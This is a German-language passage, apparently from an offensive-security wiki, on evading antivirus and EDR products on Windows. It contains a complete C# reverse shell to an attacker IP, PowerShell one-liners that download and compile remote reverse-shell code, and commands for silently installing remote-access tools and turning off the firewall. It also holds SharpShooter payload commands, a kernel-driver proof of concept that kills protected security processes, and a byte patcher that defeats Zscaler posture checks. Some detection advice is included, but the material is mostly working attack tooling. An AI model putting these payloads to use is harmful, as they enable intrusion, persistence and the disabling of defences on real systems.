1. Entfernung des Anti-Tampering – ConfuserEx verschlüsselt jeden *method body* und entschlüsselt ihn im statischen Konstruktor (`<Module>.cctor`) des *module*. Außerdem wird die PE-Prüfsumme gepatcht, sodass jede Änderung zum Absturz der Binary führt. Verwende **AntiTamperKiller**, um die verschlüsselten Metadata-Tabellen zu lokalisieren, die XOR-Keys wiederherzustellen und eine bereinigte Assembly zu schreiben:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die Ausgabe enthält die 6 Anti-Tampering-Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen deines eigenen Unpackers nützlich sein können.

2. Wiederherstellung von Symbolen und Control Flow – übergib die *clean* Datei an **de4dot-cex** (einen ConfuserEx-kompatiblen Fork von de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – wählt das ConfuserEx-2-Profil aus
• de4dot macht Control-Flow-Flattening rückgängig, stellt ursprüngliche Namespaces, Klassen und Variablennamen wieder her und entschlüsselt konstante Strings.

3. Entfernen von Proxy-Calls – ConfuserEx ersetzt direkte Methodenaufrufe durch Lightweight-Wrapper (auch *proxy calls* genannt), um die Decompilation weiter zu erschweren. Entferne sie mit **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nach diesem Schritt solltest du normale .NET-APIs wie `Convert.FromBase64String` oder `AES.Create()` statt undurchsichtiger Wrapper-Funktionen (`Class8.smethod_10`, …) sehen.

4. Manuelles Clean-up – führe die resultierende Binary unter dnSpy aus und suche nach großen Base64-Blobs oder der Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um das *reale* Payload zu lokalisieren. Häufig speichert die Malware es als ein TLV-kodiertes Byte-Array, das innerhalb von `<Module>.byte_0` initialisiert wird.

Die obige Kette stellt den Execution Flow wieder her, **ohne das schädliche Sample ausführen zu müssen** – nützlich bei der Arbeit auf einer Offline-Workstation.

> 🛈  ConfuserEx erzeugt ein benutzerdefiniertes Attribut namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um Samples automatisch zu triagieren.

#### Einzeiler
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/)-Kompilierungssuite bereitzustellen, der durch [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und Manipulationsschutz eine erhöhte Softwaresicherheit ermöglicht.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriert, wie die Sprache `C++11/14` verwendet werden kann, um zur Compile-Zeit obfuskierten Code zu erzeugen, ohne externe Tools zu verwenden oder den Compiler zu verändern.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Schicht obfuskierter Operationen hinzu, die vom C++-Template-Metaprogramming-Framework erzeugt werden und der Person, die die Anwendung cracken möchte, das Leben etwas schwerer machen.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64-Binary-Obfuscator, der verschiedene PE-Dateien obfuskieren kann, darunter: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache Engine für metamorphic code für beliebige Executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein fein abgestuftes Code-Obfuscation-Framework für von LLVM unterstützte Sprachen, das ROP (return-oriented programming) verwendet. ROPfuscator obfuskiert ein Programm auf Assembly-Code-Ebene, indem reguläre Instruktionen in ROP-Ketten umgewandelt werden, wodurch unsere natürliche Vorstellung eines normalen Kontrollflusses vereitelt wird.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein in Nim geschriebener .NET-PE-Crypter.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann vorhandene EXE/DLL-Dateien in Shellcode umwandeln und anschließend laden.

## SmartScreen & MoTW

Vielleicht ist dir dieser Bildschirm schon einmal begegnet, wenn du einige Executables aus dem Internet heruntergeladen und ausgeführt hast.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der den Endbenutzer davor schützen soll, potenziell schädliche Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen verwendet hauptsächlich einen reputationsbasierten Ansatz. Das bedeutet, dass ungewöhnlich selten heruntergeladene Anwendungen SmartScreen auslösen und dadurch den Endbenutzer warnen und ihn daran hindern, die Datei auszuführen (die Datei kann jedoch weiterhin ausgeführt werden, indem man auf More Info -> Run anyway klickt).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der beim Herunterladen von Dateien aus dem Internet automatisch erstellt wird, zusammen mit der URL, von der die Datei heruntergeladen wurde.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Überprüfen des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

> [!TIP]
> Es ist wichtig zu beachten, dass Executables, die mit einem **vertrauenswürdigen** Signaturzertifikat signiert wurden, **SmartScreen nicht auslösen**.

Eine sehr effektive Möglichkeit, deine Payloads davor zu schützen, die Mark of The Web zu erhalten, besteht darin, sie in eine Art Container wie eine ISO zu verpacken. Dies liegt daran, dass Mark-of-the-Web (MOTW) **nicht** auf **Nicht-NTFS**-Volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das Payloads in Ausgabe-Container verpackt, um Mark-of-the-Web zu umgehen.

Beispielverwendung:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier ist eine Demo zum Umgehen von SmartScreen durch das Verpacken von Payloads in ISO-Dateien mit [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein leistungsstarker Logging-Mechanismus in Windows, der es Anwendungen und Systemkomponenten ermöglicht, **Events zu protokollieren**. Er kann jedoch auch von Sicherheitsprodukten verwendet werden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie AMSI deaktiviert (umgangen) wird, ist es auch möglich, die Funktion **`EtwEventWrite`** des User-Space-Prozesses sofort zurückkehren zu lassen, ohne Events zu protokollieren. Dies wird erreicht, indem die Funktion im Speicher gepatcht wird, sodass sie sofort zurückkehrt und dadurch das ETW-Logging für diesen Prozess effektiv deaktiviert.

Weitere Informationen findest du unter **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) und [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Das Laden von C#-Binaries im Speicher ist bereits seit geraumer Zeit bekannt und stellt weiterhin eine sehr gute Möglichkeit dar, deine Post-Exploitation-Tools auszuführen, ohne vom AV erkannt zu werden.

Da der Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur um das Patchen von AMSI für den gesamten Prozess kümmern.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc usw.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen, es gibt jedoch verschiedene Vorgehensweisen:

- **Fork\&Run**

Dabei wird **ein neuer sacrificial process gestartet**, dein bösartiger Post-Exploitation-Code in diesen neuen Prozess injiziert, der bösartige Code ausgeführt und der neue Prozess nach Abschluss beendet. Dies hat sowohl Vorteile als auch Nachteile. Der Vorteil der Fork-and-Run-Methode besteht darin, dass die Ausführung **außerhalb** unseres Beacon-Implant-Prozesses stattfindet. Das bedeutet, dass die **Überlebenschance unseres **Implants** deutlich größer ist**, falls bei unserer Post-Exploitation-Aktion etwas schiefgeht oder sie erkannt wird. Der Nachteil besteht darin, dass die **Wahrscheinlichkeit, von Behavioural Detections erkannt zu werden**, größer ist.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dabei wird der bösartige Post-Exploitation-Code **in den eigenen Prozess** injiziert. Auf diese Weise musst du keinen neuen Prozess erstellen und von AV scannen lassen. Der Nachteil besteht jedoch darin, dass bei einem Fehler während der Ausführung deines Payloads die **Wahrscheinlichkeit, deinen Beacon zu verlieren**, deutlich größer ist, da dieser abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn du mehr über das Laden von C#-Assemblies lesen möchtest, sieh dir diesen Artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und deren InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) an.

Du kannst C#-Assemblies auch **aus PowerShell** laden. Sieh dir [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [das Video von S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk) an.

## Andere Programmiersprachen verwenden

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, bösartigen Code mit anderen Sprachen auszuführen, indem der kompromittierte Rechner Zugriff **auf die Interpreter-Umgebung erhält, die auf dem Attacker Controlled SMB share installiert ist**.

Indem du Zugriff auf die Interpreter-Binaries und die Umgebung auf dem SMB share gewährst, kannst du **beliebigen Code in diesen Sprachen innerhalb des Speichers** des kompromittierten Rechners ausführen.

Das Repo weist darauf hin: Defender scannt die Scripts weiterhin, aber durch die Verwendung von Go, Java, PHP usw. haben wir **mehr Flexibilität beim Umgehen statischer Signaturen**. Tests mit zufälligen, nicht obfuskierten Reverse-Shell-Scripts in diesen Sprachen waren erfolgreich.

## TokenStomping

Token stomping ist eine Technik, die es einem Angreifer ermöglicht, **das Access Token oder ein Sicherheitsprodukt wie einen EDR oder AV zu manipulieren**, wodurch dessen Berechtigungen reduziert werden können, sodass der Prozess nicht beendet wird, aber keine Berechtigungen mehr zur Überprüfung auf bösartige Aktivitäten besitzt.

Um dies zu verhindern, könnte Windows **externe Prozesse daran hindern**, Handles für die Tokens von Sicherheitsprozessen zu erhalten.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Vertrauenswürdige Software verwenden

### Chrome Remote Desktop

Wie in [**diesem Blogpost**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, ist es einfach, Chrome Remote Desktop auf dem Rechner eines Opfers zu installieren und anschließend zu verwenden, um die Kontrolle darüber zu übernehmen und Persistence aufrechtzuerhalten:<sup>[[35]](#references)</sup>
1. Lade es von https://remotedesktop.google.com/ herunter, klicke auf „Set up via SSH“ und anschließend auf die MSI-Datei für Windows, um die MSI-Datei herunterzuladen.
2. Führe den Installer beim Opfer still aus (Administratorrechte erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Kehre zur Chrome-Remote-Desktop-Seite zurück und klicke auf „Next“. Der Wizard fordert dich anschließend zur Autorisierung auf. Klicke auf die Schaltfläche „Authorize“, um fortzufahren.
4. Führe den angegebenen Parameter mit einigen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Beachte den Pin-Parameter, mit dem sich die PIN ohne Verwendung der GUI festlegen lässt.)


## Erweiterte Evasion

Evasion ist ein sehr komplexes Thema. Manchmal musst du zahlreiche verschiedene Telemetriequellen in nur einem System berücksichtigen, sodass es in ausgereiften Umgebungen praktisch unmöglich ist, vollständig unentdeckt zu bleiben.

Jede Umgebung, gegen die du vorgehst, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dringend, dir diesen Vortrag von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittenere Evasion-Techniken zu erhalten.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dies ist außerdem ein großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Alte Techniken**

### **Überprüfen, welche Teile Defender als bösartig erkennt**

Du kannst [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden. Das Tool **entfernt Teile des Binaries**, bis es **herausfindet, welcher Teil von Defender** als bösartig erkannt wird, und gibt diesen Teil aus.\
Ein weiteres Tool, das **dasselbe tut, ist** [**avred**](https://github.com/dobin/avred), mit einem offenen Web-Angebot dieses Services unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/).

### **Telnet Server**

Bis Windows10 verfügte jedes Windows über einen **Telnet Server**, den du (als Administrator) mit folgendem Befehl installieren konntest:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
**Starten** Sie es beim Systemstart und führen Sie es jetzt aus:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Telnet-Port ändern** (Stealth) und Firewall deaktivieren:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Lade es herunter von: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (du benötigst die bin-Downloads, nicht das Setup)

**AUF DEM HOST**: Führe _**winvnc.exe**_ aus und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Lege ein Passwort unter _VNC Password_ fest
- Lege ein Passwort unter _View-Only Password_ fest

Verschiebe anschließend die Binärdatei _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ auf den **Opfer**

#### **Reverse connection**

Der **Angreifer** sollte auf seinem **Host** die Binärdatei `vncviewer.exe -listen 5900` **ausführen**, damit sie bereit ist, eine umgekehrte **VNC connection** zu empfangen. Führe anschließend auf dem **Opfer** Folgendes aus: Starte den winvnc-Daemon mit `winvnc.exe -run` und führe `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus

**WARNUNG:** Um die Tarnung aufrechtzuerhalten, darfst du einige Dinge nicht tun

- Starte `winvnc` nicht, wenn es bereits läuft, da dadurch ein [Popup](https://i.imgur.com/1SROTTl.png) ausgelöst wird. Prüfe mit `tasklist | findstr winvnc`, ob es läuft
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, da dadurch [das Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png) geöffnet wird
- Führe `winvnc -h` nicht für Hilfe aus, da dadurch ein [Popup](https://i.imgur.com/oc18wcu.png) ausgelöst wird

### GreatSCT

Lade es herunter von: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
In GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Starte nun den **lister** mit `msfconsole -r file.rc` und **führe** den **xml payload** aus mit:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Der aktuelle Defender wird den Prozess sehr schnell beenden.**

### Unsere eigene reverse shell kompilieren

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C#-Revershell

Kompiliere sie mit:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Verwende es mit:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C#-Compiler verwenden
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste der C#-Obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Python zum Erstellen von Injectors – Beispiel:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Weitere Tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR aus dem Kernel Space ausschalten

Storm-2603 nutzte ein kleines Konsolenprogramm namens **Antivirus Terminator**, um Endpoint-Schutzmechanismen vor dem Ablegen der Ransomware zu deaktivieren. Das Tool bringt seinen **eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst Protected-Process-Light-(PPL-)AV-Dienste nicht blockieren können.<sup>[[12]](#references)</sup>

Wichtige Erkenntnisse
1. **Signierter Treiber**: Die auf die Festplatte gelieferte Datei ist `ServiceMouse.sys`, aber das Binary ist der legitim signierte Treiber `AToolsKrnl64.sys` aus Antiy Labs’ „System In-Depth Analysis Toolkit“. Da der Treiber eine gültige Microsoft-Signatur trägt, wird er auch bei aktiviertem Driver-Signature-Enforcement (DSE) geladen.
2. **Service-Installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die erste Zeile registriert den Treiber als **Kernel-Service**, und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem Userland zugänglich wird.
3. **Vom Treiber bereitgestellte IOCTLs**
| IOCTL code | Fähigkeit                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Einen beliebigen Prozess anhand seiner PID beenden (wird zum Beenden von Defender/EDR-Diensten verwendet) |
| `0x990000D0` | Eine beliebige Datei auf der Festplatte löschen |
| `0x990001D0` | Den Treiber entladen und den Service entfernen |

Minimaler C-Proof-of-Concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Warum es funktioniert**: BYOVD umgeht den User-Mode-Schutz vollständig; Code, der im Kernel ausgeführt wird, kann *geschützte* Prozesse öffnen, sie beenden oder Kernel-Objekte manipulieren, unabhängig von PPL/PP, ELAM oder anderen Hardening-Funktionen.

Erkennung / Gegenmaßnahmen
•  Microsofts vulnerable-driver block list (`HVCI`, `Smart App Control`) aktivieren, damit Windows das Laden von `AToolsKrnl64.sys` verweigert.
•  Das Erstellen neuer *Kernel*-Services überwachen und alarmieren, wenn ein Treiber aus einem für alle Benutzer beschreibbaren Verzeichnis geladen wird oder nicht auf der Allow-List vorhanden ist.
•  Auf User-Mode-Handles zu benutzerdefinierten Device-Objekten achten, auf die verdächtige `DeviceIoControl`-Aufrufe folgen.

### Zscaler Client Connector Posture Checks durch Binary-Patching auf der Festplatte umgehen

Zscalers **Client Connector** wendet Device-Posture-Regeln lokal an und nutzt Windows RPC, um die Ergebnisse an andere Komponenten zu übermitteln. Zwei schwache Designentscheidungen ermöglichen einen vollständigen Bypass:

1. Die Posture-Auswertung findet **vollständig clientseitig** statt (ein Boolean wird an den Server gesendet).
2. Interne RPC-Endpunkte prüfen lediglich, ob die verbindende ausführbare Datei **von Zscaler signiert** ist (über `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Durch das **Patching von vier signierten Binaries auf der Festplatte** können beide Mechanismen neutralisiert werden:

| Binary | Gepatchte ursprüngliche Logik | Ergebnis |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Prüfung compliant ist |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | NOP-ed ⇒ jeder Prozess, auch ein unsignierter, kann sich an die RPC-Pipes binden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Durch `mov eax,1 ; ret` ersetzt |
| `ZSATunnel.exe` | Integritätsprüfungen des Tunnels | Kurzgeschlossen |

Minimaler Ausschnitt des Patchers:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nach dem Ersetzen der ursprünglichen Dateien und dem Neustart des Service-Stacks:

* **Alle** Posture-Checks werden **grün/konform** angezeigt.
* Nicht signierte oder modifizierte Binaries können die Named-Pipe-RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das interne Netzwerk, das durch die Zscaler-Richtlinien definiert ist.

Diese Fallstudie zeigt, wie sich rein clientseitige Trust-Entscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches umgehen lassen.

## Protected Process Light (PPL) missbrauchen, um AV/EDR mit LOLBINs zu manipulieren

Protected Process Light (PPL) erzwingt eine Signer-/Level-Hierarchie, sodass nur gleich oder höher geschützte Prozesse sich gegenseitig manipulieren können. Aus offensiver Sicht kann man, wenn sich ein PPL-fähiges Binary legitim starten lässt und seine Argumente kontrolliert werden können, harmlose Funktionalität (z. B. Logging) in eine eingeschränkte, PPL-gestützte Schreibprimitive gegen geschützte Verzeichnisse von AV/EDR umwandeln.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Was einen Prozess als PPL ausführt
- Die Ziel-EXE (und alle geladenen DLLs) muss mit einem PPL-fähigen EKU signiert sein.
- Der Prozess muss mit CreateProcess unter Verwendung der Flags `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` erstellt werden.
- Es muss eine kompatible Protection Level angefordert werden, die mit dem Signer des Binaries übereinstimmt (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signer und `PROTECTION_LEVEL_WINDOWS` für Windows-Signer). Falsche Level führen dazu, dass die Erstellung fehlschlägt.

Eine allgemeinere Einführung in PP/PPL und den LSASS-Schutz gibt es hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-Tools
- Open-Source-Hilfsprogramm: CreateProcessAsPPL (wählt das Protection Level aus und leitet Argumente an die Ziel-EXE weiter):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Verwendungsmuster:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
